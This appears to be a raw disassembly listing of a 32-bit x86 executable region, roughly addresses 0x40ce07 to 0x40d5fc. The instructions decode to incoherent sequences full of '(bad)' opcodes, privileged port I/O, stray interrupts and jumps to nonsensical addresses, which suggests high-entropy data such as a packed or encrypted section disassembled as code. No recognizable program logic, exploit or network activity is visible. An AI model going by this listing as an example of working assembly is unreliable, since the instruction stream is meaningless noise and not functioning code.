  40ce07:	out    0xad,eax
  40ce09:	or     DWORD PTR [ebp-0x3c10c228],eax
  40ce0f:	lea    esi,[ecx]
  40ce11:	mov    dh,0x68
  40ce13:	int    0x44
  40ce15:	fisubr WORD PTR [edx-0x536b9576]
  40ce1b:	(bad)  
  40ce1c:	das    
  40ce1d:	not    ebp
  40ce1f:	dec    edx
  40ce20:	pop    ds
  40ce21:	inc    ebx
  40ce22:	jmp    0x56b55f37
  40ce27:	retf   0xc521
  40ce2a:	ss push esi
  40ce2c:	div    esi
  40ce2e:	push   esp
  40ce2f:	dec    edi
  40ce30:	jmp    0x5dab74c7
  40ce35:	sub    esi,0xc89a3897
  40ce3b:	sub    eax,0x60ec49cd
  40ce40:	shl    esp,cl
  40ce42:	icebp  
  40ce43:	aaa    
  40ce44:	(bad)  
  40ce45:	push   edi
  40ce46:	not    DWORD PTR [ecx+edx*4-0x28568983]
  40ce4d:	mov    eax,0xb1ad41b1
  40ce52:	jg     0x40cdf7
  40ce54:	test   al,0xb1
  40ce56:	test   esi,ebx
  40ce58:	scas   eax,DWORD PTR es:[edi]
  40ce59:	(bad)  
  40ce5a:	std    
  40ce5b:	or     bh,ah
  40ce5d:	and    DWORD PTR [ecx-0x7d],eax
  40ce60:	test   BYTE PTR [edx+ecx*2+0x50],al
  40ce64:	ror    BYTE PTR [ebx+0x0],cl
  40ce67:	jne    0x40cdf2
  40ce69:	and    al,0x52
  40ce6b:	inc    ecx
  40ce6c:	dec    edi
  40ce6d:	(bad)  
  40ce6e:	sbb    BYTE PTR [ebx],al
  40ce70:	add    edx,edx
  40ce72:	or     eax,0x9b0bd573
  40ce77:	or     eax,0x7f472c3c
  40ce7c:	icebp  
  40ce7d:	jmp    0x488b26b0
  40ce82:	test   BYTE PTR [eax*1-0x3aeaf90],0xff
  40ce8a:	lds    edx,FWORD PTR [edi+esi*4-0x67e7f0d]
  40ce91:	adc    BYTE PTR [edi],0x3f
  40ce94:	jno    0x40ce61
  40ce96:	jecxz  0x40ce2e
  40ce98:	jnp    0x40ce4d
  40ce9a:	pop    ds
  40ce9b:	push   edx
  40ce9c:	xlat   BYTE PTR ds:[ebx]
  40ce9d:	adc    edi,0x6cd883ab
  40cea3:	mov    esp,0x10364457
  40cea8:	xor    DWORD PTR [ebx+edi*4-0x3664a066],0xffffffd3
  40ceb0:	clc    
  40ceb1:	jl     0x40cef1
  40ceb3:	mov    BYTE PTR [esi+ebx*2],al
  40ceb6:	or     eax,ebp
  40ceb8:	sub    BYTE PTR [eax],bl
  40ceba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cebb:	cmp    bh,ch
  40cebd:	hlt    
  40cebe:	ins    DWORD PTR es:[edi],dx
  40cebf:	mov    ds:0x7dde4e37,al
  40cec4:	or     BYTE PTR [edi],cl
  40cec6:	dec    esi
  40cec7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cec8:	jb     0x40cedb
  40ceca:	lods   eax,DWORD PTR ds:[esi]
  40cecb:	jmp    0x4d02d45a
  40ced0:	aad    0xc0
  40ced2:	jbe    0x40ce6c
  40ced4:	cli    
  40ced5:	out    0x51,eax
  40ced7:	ficom  DWORD PTR [esi+0x26]
  40ceda:	cli    
  40cedb:	pushf  
  40cedc:	xchg   edx,eax
  40cedd:	push   0x19
  40cedf:	jns    0x40ce7b
  40cee1:	psrlq  mm3,QWORD PTR [ecx+edx*8]
  40cee5:	sahf   
  40cee6:	cmp    eax,edi
  40cee8:	lds    ecx,FWORD PTR [eax]
  40ceea:	sub    bh,BYTE PTR [edx-0x1f]
  40ceed:	ror    BYTE PTR [edi-0x3015bb6c],cl
  40cef3:	daa    
  40cef4:	clc    
  40cef5:	and    al,0x9b
  40cef7:	sbb    eax,esp
  40cef9:	sub    DWORD PTR [edi+0x6f14f01e],esi
  40ceff:	sti    
  40cf00:	aaa    
  40cf01:	sbb    ebx,ebp
  40cf03:	mov    esp,0x5d5d6857
  40cf08:	dec    esi
  40cf09:	fstp   TBYTE PTR [ebp-0x7edd251e]
  40cf0f:	inc    eax
  40cf10:	cmp    esi,edi
  40cf12:	mov    BYTE PTR [ebp+0x16ed99a5],dh
  40cf18:	les    eax,FWORD PTR [eax]
  40cf1a:	inc    esi
  40cf1b:	enter  0x2d43,0x9b
  40cf1f:	add    al,0x8a
  40cf21:	push   ss
  40cf22:	add    eax,0x632cb976
  40cf27:	jecxz  0x40cf9c
  40cf29:	dec    esp
  40cf2a:	mov    dl,0x71
  40cf2c:	mov    ch,0x2
  40cf2e:	fstp   TBYTE PTR [eax+0x4d4ffc0b]
  40cf34:	mov    eax,0x4a701525
  40cf39:	(bad)  
  40cf3a:	out    dx,eax
  40cf3b:	inc    edx
  40cf3c:	aad    0x58
  40cf3e:	loop   0x40cf4c
  40cf40:	or     ebp,ecx
  40cf42:	sub    ah,BYTE PTR [edx+0x6b48df75]
  40cf48:	scas   al,BYTE PTR es:[edi]
  40cf49:	popf   
  40cf4a:	sub    esi,edi
  40cf4c:	add    edx,DWORD PTR [ecx-0x3ecf4c29]
  40cf52:	in     eax,0xbf
  40cf54:	adc    eax,0x530cd624
  40cf59:	sti    
  40cf5a:	sbb    DWORD PTR [edi],0xde0ad4a3
  40cf60:	mov    ebx,0x36f97a30
  40cf65:	mov    dh,0x65
  40cf67:	ins    DWORD PTR es:[edi],dx
  40cf68:	not    DWORD PTR [esp+ebp*1]
  40cf6b:	clc    
  40cf6c:	add    ah,BYTE PTR [edi+0x3c9dc982]
  40cf72:	and    cl,BYTE PTR [ecx+eax*1-0x21]
  40cf76:	add    al,0x71
  40cf78:	inc    ebp
  40cf79:	in     eax,0xcf
  40cf7b:	nop
  40cf7c:	aas    
  40cf7d:	imul   eax,DWORD PTR [edi],0x365e7d87
  40cf83:	mov    ch,ah
  40cf85:	(bad)  ds:0xa62fd2c6
  40cf8b:	inc    esp
  40cf8c:	loop   0x40cf28
  40cf8e:	ret    
  40cf8f:	add    cl,ah
  40cf91:	xor    eax,0xbd5fb753
  40cf96:	pushf  
  40cf97:	(bad)  
  40cf98:	jns    0x40cfd5
  40cf9a:	int3   
  40cf9b:	arpl   WORD PTR [ecx+0x6b365e00],bx
  40cfa1:	jg     0x40cfae
  40cfa3:	test   eax,0xdc31589a
  40cfa8:	jmp    0xb0fa:0xf24e8ea1
  40cfaf:	mov    ds:0x70220a62,eax
  40cfb4:	push   eax
  40cfb5:	movq   mm5,QWORD PTR [eax-0x461a3083]
  40cfbc:	cdq    
  40cfbd:	pop    edx
  40cfbe:	scas   al,BYTE PTR es:[edi]
  40cfbf:	mov    esp,edx
  40cfc1:	mov    cl,0x7b
  40cfc3:	mov    ch,0xe8
  40cfc5:	mov    eax,ds:0xf66eaed5
  40cfca:	mov    ecx,DWORD PTR [esi-0x1effedee]
  40cfd0:	imul   ecx,DWORD PTR [ecx+0x19],0xffffffce
  40cfd4:	cmp    dl,BYTE PTR [ebx+0x38]
  40cfd7:	push   ds
  40cfd8:	ja     0x40d020
  40cfda:	mov    ebp,0x466c3882
  40cfdf:	(bad)  
  40cfe0:	out    dx,al
  40cfe1:	test   DWORD PTR [ecx+0x3e0e0aca],eax
  40cfe7:	jne    0x40cfbf
  40cfe9:	and    eax,0x4810fccd
  40cfee:	(bad)
  40cff2:	inc    esp
  40cff3:	les    esp,FWORD PTR [ecx]
  40cff5:	xlat   BYTE PTR ds:[ebx]
  40cff6:	dec    esi
  40cff7:	mov    esp,0x5c90bba
  40cffc:	or     esp,DWORD PTR [edx-0x1c]
  40cfff:	mov    WORD PTR [edx],fs
  40d001:	dec    eax
  40d002:	add    ch,BYTE PTR [esi]
  40d004:	imul   edi,esp,0xffffff90
  40d007:	inc    edi
  40d008:	and    edx,edx
  40d00a:	(bad)  
  40d00b:	xor    eax,0xc8bf16c9
  40d010:	ins    DWORD PTR es:[edi],dx
  40d011:	imul   edi,DWORD PTR [edx-0x7b6274e0],0x7
  40d018:	in     al,dx
  40d019:	inc    esp
  40d01a:	test   DWORD PTR [esi+0x2b6ff2d3],eax
  40d020:	(bad)  
  40d021:	std    
  40d022:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d023:	mov    ds:0x1e723a67,al
  40d028:	loope  0x40d040
  40d02a:	mov    ch,0x52
  40d02c:	mul    DWORD PTR [ecx]
  40d02e:	jg     0x40d00d
  40d030:	mov    DWORD PTR [eax+0x62],ebx
  40d033:	xor    esi,edi
  40d035:	lods   al,BYTE PTR ds:[esi]
  40d036:	cmp    edx,DWORD PTR [esi-0x4073bcfd]
  40d03c:	mov    eax,ds:0x4b45682d
  40d041:	imul   edi,edx,0x31991eba
  40d047:	push   ebx
  40d048:	sub    al,0xf5
  40d04a:	getsec 
  40d04c:	sbb    BYTE PTR [esi],cl
  40d04e:	hlt    
  40d04f:	dec    esp
  40d050:	fst    QWORD PTR [ebp-0x48]
  40d053:	push   edx
  40d054:	xor    DWORD PTR [edi-0x2f],ebp
  40d057:	fdivr  DWORD PTR [edi]
  40d059:	mov    ds:0xa4e581c3,eax
  40d05e:	mov    eax,ds:0xc995cbed
  40d063:	jo     0x40d054
  40d065:	pop    es
  40d066:	push   eax
  40d067:	out    0x13,al
  40d069:	inc    ebp
  40d06a:	pop    ecx
  40d06b:	ins    DWORD PTR es:[edi],dx
  40d06c:	rcl    BYTE PTR [ebx+0x1d],1
  40d06f:	adc    esp,DWORD PTR [ecx]
  40d071:	(bad)  
  40d072:	sahf   
  40d073:	push   cs
  40d074:	sub    al,0xef
  40d076:	or     al,0x9f
  40d078:	out    0x57,al
  40d07a:	jecxz  0x40d0f7
  40d07c:	mov    eax,ds:0x9fd2adbe
  40d081:	iret   
  40d082:	and    BYTE PTR [eax-0x2fecb376],bl
  40d088:	sbb    ecx,DWORD PTR ds:[edi]
  40d08b:	iret   
  40d08c:	test   eax,0x985353d5
  40d091:	inc    esp
  40d092:	cmc    
  40d093:	je     0x40d048
  40d095:	sub    DWORD PTR [edx],edx
  40d097:	jbe    0x40d0f7
  40d099:	sub    BYTE PTR [esi+ebx*4+0x1c],bl
  40d09d:	sar    BYTE PTR [ecx],0x1e
  40d0a0:	sahf   
  40d0a1:	and    al,0x6a
  40d0a3:	mov    ch,0xa5
  40d0a5:	jle    0x40d101
  40d0a7:	lock cld 
  40d0a9:	dec    esi
  40d0aa:	adc    edx,esi
  40d0ac:	pusha  
  40d0ad:	mov    edi,0xc8c50bba
  40d0b2:	fsubr  QWORD PTR [esi-0x30ad0b04]
  40d0b8:	or     esi,ebp
  40d0ba:	(bad)  
  40d0bb:	int    0x44
  40d0bd:	pop    edi
  40d0be:	or     ch,dl
  40d0c0:	jge    0x40d06a
  40d0c2:	xchg   DWORD PTR [ecx-0x1eb50423],eax
  40d0c8:	lock or al,0x7e
  40d0cb:	test   eax,0x63ac6d22
  40d0d0:	pop    ss
  40d0d1:	popf   
  40d0d2:	clc    
  40d0d3:	jbe    0x40d12c
  40d0d5:	retf   
  40d0d6:	or     esp,DWORD PTR [ecx+0x31]
  40d0d9:	xchg   BYTE PTR [eax],al
  40d0db:	out    0xe9,eax
  40d0dd:	mov    ds:0x273f36c6,al
  40d0e2:	adc    al,0x60
  40d0e4:	lea    eax,[ecx+0x22]
  40d0e7:	loop   0x40d126
  40d0e9:	pop    eax
  40d0ea:	mov    cl,0x95
  40d0ec:	add    BYTE PTR [ecx+edx*1-0x62bbb6ab],ch
  40d0f3:	push   ebp
  40d0f4:	(bad)  
  40d0f5:	movhps QWORD PTR fs:[edi-0x39e8f51b],xmm4
  40d0fd:	(bad)  [ebp-0x164112f3]
  40d103:	ins    BYTE PTR es:[edi],dx
  40d104:	int    0x2c
  40d106:	call   0x58d2aafa
  40d10b:	sbb    al,0x59
  40d10d:	add    eax,0xf4841569
  40d112:	sub    al,0x68
  40d114:	add    esi,DWORD PTR [edi+0x4e]
  40d117:	das    
  40d118:	loop   0x40d17b
  40d11a:	push   eax
  40d11b:	and    DWORD PTR [ecx],esp
  40d11d:	sub    bh,cl
  40d11f:	das    
  40d120:	pop    esp
  40d121:	out    dx,eax
  40d122:	ins    BYTE PTR es:[edi],dx
  40d123:	jp     0x40d0d3
  40d125:	sbb    DWORD PTR [ebp-0x22a37a93],ebp
  40d12b:	cwde   
  40d12c:	dec    esi
  40d12d:	sub    DWORD PTR [eax+0x41446d55],edi
  40d133:	std    
  40d134:	test   eax,0xc1349dca
  40d139:	pop    esp
  40d13a:	sub    BYTE PTR [edi+0x153192de],al
  40d140:	nop
  40d141:	leave  
  40d142:	sahf   
  40d143:	stc    
  40d144:	arpl   WORD PTR [eax-0x18031046],ax
  40d14a:	sahf   
  40d14b:	cmc    
  40d14c:	outs   dx,BYTE PTR ds:[esi]
  40d14d:	es aaa 
  40d14f:	sub    eax,0x5f474830
  40d154:	(bad)  
  40d155:	repnz mov esp,0xe83717a7
  40d15b:	xor    BYTE PTR [ebx],ch
  40d15d:	addr16 jae 0x40d115
  40d160:	enter  0xecd5,0x11
  40d164:	(bad)  
  40d165:	cld    
  40d166:	cmp    esp,edi
  40d168:	pop    edx
  40d169:	std    
  40d16a:	ins    DWORD PTR es:[edi],dx
  40d16b:	mov    ah,0xc8
  40d16d:	popf   
  40d16e:	into   
  40d16f:	sar    esi,1
  40d171:	inc    edx
  40d172:	inc    edi
  40d173:	sets   BYTE PTR [edi]
  40d176:	ds popf 
  40d178:	icebp  
  40d179:	mov    WORD PTR [edx],?
  40d17b:	sub    eax,0x4b85f5e
  40d180:	mov    DWORD PTR [ecx],ebx
  40d182:	add    DWORD PTR [ebp+0x746376a],edx
  40d188:	test   eax,0xb4c02e49
  40d18d:	arpl   WORD PTR [edx-0x44],ax
  40d190:	enter  0x2419,0x9d
  40d194:	test   al,0x21
  40d196:	in     eax,dx
  40d197:	in     al,dx
  40d198:	(bad)  
  40d199:	in     al,0xb2
  40d19b:	hlt    
  40d19c:	cdq    
  40d19d:	adc    edx,esi
  40d19f:	fxch   st(5)
  40d1a1:	sub    al,0xed
  40d1a3:	mov    cl,0x4a
  40d1a5:	popa   
  40d1a6:	sub    BYTE PTR [edx-0x25562d0f],0x6c
  40d1ad:	push   ecx
  40d1ae:	or     edx,edx
  40d1b0:	xchg   edx,eax
  40d1b1:	xchg   ebx,eax
  40d1b2:	rcr    BYTE PTR [edx],1
  40d1b4:	mov    esi,esp
  40d1b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d1b7:	popf   
  40d1b8:	stc    
  40d1b9:	jbe    0x40d1d0
  40d1bb:	xchg   esp,eax
  40d1bc:	xchg   ecx,eax
  40d1bd:	(bad)  
  40d1be:	cmc    
  40d1bf:	ret    0x46a2
  40d1c2:	jns    0x40d147
  40d1c4:	int    0x41
  40d1c6:	lea    edi,[ebp+0x7ba27436]
  40d1cc:	pop    ss
  40d1cd:	(bad)  
  40d1ce:	jl     0x40d16f
  40d1d0:	stos   DWORD PTR es:[edi],eax
  40d1d1:	mov    edx,0x57be3dff
  40d1d7:	test   DWORD PTR [esi+0x739e8ebf],edx
  40d1dd:	lods   eax,DWORD PTR ds:[esi]
  40d1de:	xchg   edx,eax
  40d1df:	mov    ds:0xd5f818b8,eax
  40d1e4:	pmaxsw mm3,QWORD PTR [esi]
  40d1e7:	inc    esp
  40d1e8:	mov    edi,0x10204638
  40d1ed:	loopne 0x40d251
  40d1ef:	pop    esp
  40d1f0:	std    
  40d1f1:	(bad)  
  40d1f2:	bound  ebx,QWORD PTR [edi]
  40d1f4:	and    al,0x82
  40d1f6:	dec    edx
  40d1f7:	out    dx,al
  40d1f8:	mov    ebp,0x6459f975
  40d1fd:	and    ah,BYTE PTR [ecx+esi*1]
  40d200:	ja     0x40d1ee
  40d202:	das    
  40d203:	xchg   edx,eax
  40d204:	int    0x4
  40d206:	inc    ebx
  40d207:	in     eax,dx
  40d208:	mov    gs,WORD PTR [ebp-0x38]
  40d20b:	enter  0xa9b5,0x2c
  40d20f:	push   cs
  40d210:	xchg   ebp,eax
  40d211:	in     al,0xc8
  40d213:	ins    BYTE PTR es:[edi],dx
  40d214:	hlt    
  40d215:	fsub   st(2),st
  40d217:	in     eax,0x61
  40d219:	ja     0x40d1e1
  40d21b:	repnz mov ebx,0xb06aae5c
  40d221:	and    DWORD PTR [edi],ebp
  40d223:	loop   0x40d1c7
  40d225:	loop   0x40d243
  40d227:	mov    cl,BYTE PTR [edi+0x134498da]
  40d22d:	sub    BYTE PTR [eax+0x4c6f20],dl
  40d233:	add    al,0xb
  40d235:	inc    DWORD PTR [edx+0x47]
  40d238:	mov    eax,0xac9bf27d
  40d23d:	lar    ebp,WORD PTR [eax+0x1f1b8c0a]
  40d244:	add    eax,0xc1123429
  40d249:	lds    ebx,FWORD PTR [edx+0x6e]
  40d24c:	fdiv   QWORD PTR [esp+edi*2+0x57]
  40d250:	mov    ah,0xe7
  40d252:	mov    esi,0xcf3a63a8
  40d257:	hlt    
  40d258:	pop    eax
  40d259:	lds    ebp,FWORD PTR [eax+edi*2]
  40d25c:	sbb    al,0xa5
  40d25e:	jp     0x40d275
  40d260:	sub    DWORD PTR [ecx],edi
  40d262:	push   eax
  40d263:	xchg   esp,eax
  40d264:	mov    ebp,ebp
  40d266:	rol    DWORD PTR [edi+0x138eeffd],1
  40d26c:	push   esp
  40d26d:	mov    bl,0x2c
  40d26f:	rol    DWORD PTR [edi-0x58],0x9f
  40d273:	push   0xffffffaa
  40d275:	xor    eax,0x6aa63d96
  40d27a:	lea    eax,[esi+0x3]
  40d27d:	inc    edi
  40d27e:	pop    ebx
  40d27f:	lods   al,BYTE PTR ds:[esi]
  40d280:	mov    edx,0x4d315268
  40d285:	and    bh,BYTE PTR [esi]
  40d287:	adc    BYTE PTR [esi],0x22
  40d28a:	jbe    0x40d26d
  40d28c:	or     edx,DWORD PTR [bx+si+0x49]
  40d290:	icebp  
  40d291:	pusha  
  40d292:	retf   0x5246
  40d295:	std    
  40d296:	pop    ebp
  40d297:	cli    
  40d298:	outs   dx,BYTE PTR ds:[esi]
  40d299:	out    0x62,eax
  40d29b:	push   edx
  40d29c:	cmp    eax,0x547df3f0
  40d2a1:	in     eax,0xac
  40d2a3:	pop    ss
  40d2a4:	bound  edx,QWORD PTR [edx-0x23878cc7]
  40d2aa:	sti    
  40d2ab:	sub    ecx,DWORD PTR [esi-0x3d]
  40d2ae:	test   BYTE PTR [ebx+eax*4+0x53],0xfc
  40d2b3:	inc    edx
  40d2b4:	lds    ebp,FWORD PTR [edi-0x7f72de6]
  40d2ba:	stos   DWORD PTR es:[edi],eax
  40d2bb:	jno    0x40d311
  40d2bd:	sub    dh,al
  40d2bf:	test   DWORD PTR [ecx],0xb8713f6f
  40d2c5:	cwde   
  40d2c6:	mov    bh,0x89
  40d2c8:	pop    esp
  40d2c9:	jns    0x40d334
  40d2cb:	xor    eax,0xcad6e017
  40d2d0:	xor    BYTE PTR [edi],bh
  40d2d2:	dec    ebx
  40d2d3:	sub    al,0x66
  40d2d5:	push   esp
  40d2d6:	popa   
  40d2d7:	push   esp
  40d2d8:	dec    esi
  40d2d9:	jle    0x40d338
  40d2db:	loopne 0x40d2fa
  40d2dd:	int    0x77
  40d2df:	pop    ds
  40d2e0:	fucomp st(7)
  40d2e2:	fsubr  QWORD PTR [ebx+0x3b]
  40d2e5:	lea    ebp,[eax+0x43f27224]
  40d2eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d2ec:	add    ecx,DWORD PTR [ebx-0x21]
  40d2ef:	cmc    
  40d2f0:	inc    ecx
  40d2f1:	jmp    0x40d320
  40d2f3:	mov    ah,0x41
  40d2f5:	iret   
  40d2f6:	in     al,0x82
  40d2f8:	sbb    BYTE PTR [ebp+0x3e3cab03],0x20
  40d2ff:	das    
  40d300:	cmp    al,0xde
  40d302:	mov    ebp,0xf2056bad
  40d307:	je     0x40d33f
  40d309:	ds retf 
  40d30b:	ds jb  0x40d31e
  40d30e:	shl    DWORD PTR [edi+0x79f6ac58],cl
  40d314:	push   esi
  40d315:	pushf  
  40d316:	xlat   BYTE PTR ds:[ebx]
  40d317:	retf   
  40d318:	and    al,0x3f
  40d31a:	and    al,0x54
  40d31c:	test   al,0x18
  40d31e:	sub    al,0xec
  40d320:	ret    0x50b2
  40d323:	ror    BYTE PTR [eax-0x13],1
  40d326:	mov    ebx,0xf2112bd6
  40d32b:	lahf   
  40d32c:	pushf  
  40d32d:	mov    eax,0xd1d5ce23
  40d332:	add    eax,0xe4e77c11
  40d337:	xor    al,0x4
  40d339:	vpmuludq xmm4,xmm2,XMMWORD PTR [esi]
  40d33d:	cmp    BYTE PTR [eax-0x22],0x1d
  40d341:	fistp  DWORD PTR [edi+ebx*8-0x65278da]
  40d348:	jge    0x40d33e
  40d34a:	add    esp,DWORD PTR [edx+0x9da5a90]
  40d350:	daa    
  40d351:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d352:	sub    DWORD PTR [esi-0x36],eax
  40d355:	les    ebp,FWORD PTR [ecx-0x48]
  40d358:	push   cs
  40d359:	push   edx
  40d35a:	fcomp  st(2)
  40d35c:	jne    0x40d3ca
  40d35e:	cs aas 
  40d360:	das    
  40d361:	sti    
  40d362:	rcl    DWORD PTR [edx+edx*2-0x2dc3fca2],0x1
  40d36a:	retf   
  40d36b:	js     0x40d3e9
  40d36d:	xor    eax,0x611ac8a6
  40d372:	mov    ah,0x9e
  40d374:	pop    ebp
  40d375:	mov    esp,0x5f68cf70
  40d37a:	(bad)  
  40d37b:	adc    esi,DWORD PTR [ebp+0x4476909c]
  40d381:	fbld   TBYTE PTR [edi+0x4520367e]
  40d387:	stos   BYTE PTR es:[edi],al
  40d388:	mov    edx,0x8949c8c2
  40d38d:	mov    ds:0xae605423,eax
  40d392:	aad    0xd5
  40d394:	(bad)  
  40d395:	cmc    
  40d396:	mov    DWORD PTR [ebx],esi
  40d398:	inc    eax
  40d399:	push   cs
  40d39a:	add    edi,ebp
  40d39c:	push   edx
  40d39d:	xor    BYTE PTR [edi-0x31],ch
  40d3a0:	shl    edx,1
  40d3a2:	xchg   ebp,eax
  40d3a3:	dec    ecx
  40d3a4:	aas    
  40d3a5:	xchg   edi,eax
  40d3a6:	push   ss
  40d3a7:	lods   eax,DWORD PTR ds:[esi]
  40d3a8:	imul   ebp,eax,0x41
  40d3ab:	stos   DWORD PTR es:[edi],eax
  40d3ac:	push   edx
  40d3ad:	jmp    0x40d33f
  40d3af:	push   ds
  40d3b0:	sub    al,BYTE PTR [ebp-0x51]
  40d3b3:	sub    eax,0xd2c590e0
  40d3b8:	out    dx,al
  40d3b9:	sbb    DWORD PTR [eax-0x1f],edi
  40d3bc:	jp     0x40d406
  40d3be:	push   0x771acd5e
  40d3c3:	loope  0x40d3af
  40d3c5:	(bad)  
  40d3c6:	pusha  
  40d3c7:	or     DWORD PTR [edx+0x7183bdab],esi
  40d3cd:	enter  0xf65a,0x12
  40d3d1:	outs   dx,DWORD PTR ds:[esi]
  40d3d2:	sahf   
  40d3d3:	jle    0x40d42b
  40d3d5:	(bad)  
  40d3d6:	out    dx,al
  40d3d7:	sbb    esp,ebx
  40d3d9:	xchg   esi,eax
  40d3da:	push   edx
  40d3db:	mov    ebx,0x29ab4fb8
  40d3e0:	xchg   ebp,eax
  40d3e1:	sub    al,0xbe
  40d3e3:	adc    eax,0x6b770d0e
  40d3e8:	mov    al,ds:0xa223d50c
  40d3ed:	(bad)
  40d3f1:	test   eax,0xe4f2cacf
  40d3f6:	clc    
  40d3f7:	in     al,0x62
  40d3f9:	stos   BYTE PTR es:[edi],al
  40d3fa:	scas   eax,DWORD PTR es:[edi]
  40d3fb:	dec    edx
  40d3fc:	aam    0x17
  40d3fe:	pop    DWORD PTR [ecx+0x2a016024]
  40d404:	jle    0x40d44b
  40d406:	pop    eax
  40d407:	gs dec edi
  40d409:	cmp    al,BYTE PTR [eax-0x72fcbafd]
  40d40f:	idiv   DWORD PTR [edi+0x76a8712b]
  40d415:	push   0xffffffcd
  40d417:	mov    DWORD PTR [eax+edx*8-0x60a1307c],ebx
  40d41e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d41f:	stc    
  40d420:	jp     0x40d3af
  40d422:	fidivr WORD PTR [edx+eiz*4+0x6f6dc87e]
  40d429:	inc    esp
  40d42a:	and    BYTE PTR [esi],dl
  40d42c:	mov    bh,0xe4
  40d42e:	jo     0x40d3b8
  40d430:	sar    ah,1
  40d432:	pop    ebx
  40d433:	(bad)  
  40d434:	dec    ecx
  40d435:	pop    esp
  40d436:	xchg   ebp,eax
  40d437:	(bad)  
  40d438:	mov    ebx,0x7c5b9907
  40d43d:	out    dx,eax
  40d43e:	outs   dx,BYTE PTR ds:[esi]
  40d43f:	and    eax,0x7a1666dc
  40d444:	inc    esp
  40d445:	ret    0x7238
  40d448:	sub    esi,DWORD PTR [esi+edi*2+0x59236884]
  40d44f:	inc    edi
  40d450:	push   edi
  40d451:	push   esi
  40d452:	mov    bh,BYTE PTR [esi+0x7a]
  40d455:	mul    BYTE PTR [ecx]
  40d457:	dec    ebx
  40d458:	aad    0x60
  40d45a:	jg     0x40d441
  40d45c:	call   0x643f:0x7b896f95
  40d463:	cwde   
  40d464:	pop    eax
  40d465:	sub    ah,ch
  40d467:	push   es
  40d468:	dec    ebp
  40d469:	or     eax,0x8aaa0aef
  40d46e:	adc    DWORD PTR [ebx+0x4c33ecb9],ebx
  40d474:	daa    
  40d475:	jnp    0x40d48d
  40d477:	aaa    
  40d478:	cmc    
  40d479:	push   es
  40d47a:	mov    ecx,0xf9729f91
  40d47f:	lock outs dx,BYTE PTR ds:[esi]
  40d481:	sub    ah,BYTE PTR [ebx]
  40d483:	xchg   ebp,eax
  40d484:	ret    0x880b
  40d487:	loope  0x40d4fe
  40d489:	adc    esi,esi
  40d48b:	psrlq  mm3,QWORD PTR ds:0x638441c9
  40d492:	aam    0x9f
  40d494:	outs   dx,BYTE PTR ds:[esi]
	...
  40d511:	add    BYTE PTR [eax],al
  40d513:	add    BYTE PTR [eax],dl
  40d515:	mov    eax,0xdfff9ff7
  40d51a:	js     0x40d4db
  40d51c:	shl    BYTE PTR [ebx-0x5e],cl
  40d51f:	mov    ds:0x9ed4749e,al
  40d524:	lds    eax,FWORD PTR [ebx+0x7690000]
  40d52a:	add    BYTE PTR [eax],al
  40d52c:	es std 
  40d52e:	or     DWORD PTR [ecx+0x611e584e],ebx
  40d534:	jne    0x40d560
  40d536:	retf   
  40d537:	inc    esp
  40d538:	pop    ecx
  40d539:	sbb    DWORD PTR [edi],esp
  40d53b:	add    al,0x8d
  40d53d:	jb     0x40d503
  40d53f:	mov    ds:0xbdca7f4,eax
  40d544:	mov    dh,0x7d
  40d546:	imul   edx,ecx,0xffffff94
  40d549:	rcl    BYTE PTR [ecx],cl
  40d54b:	sub    BYTE PTR [edi-0x3e212814],bl
  40d551:	add    DWORD PTR [ecx],ebx
  40d553:	push   esi
  40d554:	mov    cl,0xa6
  40d556:	cmc    
  40d557:	xchg   ebp,eax
  40d558:	dec    ebx
  40d559:	dec    esp
  40d55a:	xchg   BYTE PTR [esi],al
  40d55c:	neg    DWORD PTR ds:0xc5e73b30
  40d562:	xchg   ecx,eax
  40d563:	sbb    eax,0xde3dbb31
  40d568:	dec    ecx
  40d569:	push   0x6c
  40d56b:	jne    0x40d5d3
  40d56d:	push   ebx
  40d56f:	ror    cl,1
  40d571:	sbb    DWORD PTR [edi],edx
  40d573:	mov    ebx,esp
  40d575:	push   esp
  40d576:	aas    
  40d577:	sub    DWORD PTR [esi+0x1b],ebp
  40d57a:	adc    al,0x41
  40d57c:	lods   al,BYTE PTR ds:[esi]
  40d57d:	sub    ebp,DWORD PTR [eax+0x2a169fd9]
  40d583:	mov    BYTE PTR [ecx+0x24],ah
  40d586:	frstor [edi+eiz*4]
  40d589:	mov    gs,WORD PTR [edx]
  40d58b:	push   edi
  40d58c:	or     al,0x8a
  40d58e:	loopne 0x40d597
  40d590:	cld    
  40d591:	pushf  
  40d592:	sub    BYTE PTR [edi-0x1b],cl
  40d595:	or     bl,BYTE PTR [ecx+eiz*4]
  40d598:	fidiv  WORD PTR [eax+0x7c062149]
  40d59e:	jbe    0x40d531
  40d5a0:	fnstsw WORD PTR [ecx-0x59]
  40d5a3:	ins    DWORD PTR es:[edi],dx
  40d5a4:	cmp    eax,DWORD PTR [ebp*1-0x4fd918ea]
  40d5ab:	test   DWORD PTR [edi],0x6b77c347
  40d5b1:	shl    DWORD PTR [eax+0x54502d6e],1
  40d5b7:	test   DWORD PTR ds:0xa25d51de,esp
  40d5bd:	ins    DWORD PTR es:[edi],dx
  40d5be:	mov    BYTE PTR [ebp+0x1434c35f],dl
  40d5c4:	loopne 0x40d5d8
  40d5c6:	fnstsw WORD PTR [esi+0x6c8fa60d]
  40d5cc:	addr16 test esp,0xf3d0c843
  40d5d3:	cmp    edx,DWORD PTR [esp+ecx*2-0x67]
  40d5d7:	iret   
  40d5d8:	ret    0x2c7
  40d5db:	xchg   BYTE PTR [ebp+0x63bce443],cl
  40d5e1:	ss stos BYTE PTR es:[edi],al
  40d5e3:	push   eax
  40d5e4:	lahf   
  40d5e5:	dec    ebx
  40d5e6:	xchg   ecx,eax
  40d5e7:	add    DWORD PTR [ecx],ebp
  40d5e9:	adc    al,0xe3
  40d5eb:	xchg   esi,eax
  40d5ec:	outs   dx,BYTE PTR ds:[esi]
  40d5ed:	push   ss
  40d5ee:	inc    eax
  40d5ef:	stos   BYTE PTR es:[edi],al
  40d5f0:	idiv   BYTE PTR [ebp-0x699e5807]
  40d5f6:	mov    dl,BYTE PTR [esi-0x73]
  40d5f9:	fs in  eax,dx
  40d5fb:	cdq    
  40d5fc:	xchg   edx,eax
